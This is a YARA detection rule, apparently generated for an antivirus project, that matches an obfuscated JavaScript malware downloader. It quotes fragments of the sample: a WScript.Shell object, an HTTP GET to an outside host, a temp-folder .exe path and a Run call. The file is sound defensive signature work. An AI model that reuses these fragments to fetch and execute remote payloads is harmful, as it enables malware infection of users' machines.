rule sig_20160328_09b32e629c042b84b66887ee00b14574 {
  meta:
    description = "datamaliciousorder - file 20160328_09b32e629c042b84b66887ee00b14574.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2b09f974242f1c46ba1d57dfc042f8e8e03b927779753fe07fbfc8e3d010de1d"

  strings:
    $s1  = "function Assuovw() {return Zxwotxmbu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"rEEJTfgX7qT.exe\";};" fullword ascii
    $s2  = "Yueywxbt[Lvgefszcc](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Dvjgtolnl](Mxcldvsd() * 11)} while (Yueywxbt[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zxwotxmbu = function Qhklb() {return WScript[Haxlel](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Sfubcshljw(Etuecy, Ovsazya){return Etuecy - Ovsazya;};" fullword ascii
    $s6  = "function Ydbrnun() {return ((Auwkxywmis == true) && (Auwkxywmis == Qbuicnmoh)) ? 1 : Wiybqhbdyg;};" fullword ascii
    $s7  = "function Pgaxa(Xzjjocu){Zxwotxmbu[\"Run\"](Xzjjocu, Wiybqhbdyg, Wiybqhbdyg);};" fullword ascii
    $s8  = "return Sfubcshljw(Apjxie, Yxkxpplx);" fullword ascii
    $s9  = "function Hkihj(){return Kxhkyj;};" fullword ascii
    $s10 = "function Fsatemw(){return Haxlel;};" fullword ascii
    $s11 = "function Bncksm()" fullword ascii
    $s12 = "function Gpwnhldlpm(Lsefebtik) {var Oyfcmtmn = (1, 2, 3, 4, 5, Lsefebtik); return Oyfcmtmn;};" fullword ascii
    $s13 = "var Cvgyjehbi = false;" fullword ascii
    $s14 = "Auwkxywmis = true; " fullword ascii
    $s15 = "var Ykztjlnjg = new this[\"Date\"]();" fullword ascii
    $s16 = "var Auwkxywmis = false;" fullword ascii
    $s17 = "var Qbuicnmoh = false;" fullword ascii
    $s18 = "Qbuicnmoh = true; " fullword ascii
    $s19 = "function Mxcldvsd(){return 22;};" fullword ascii
    $s20 = " while (Roopndtjol){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}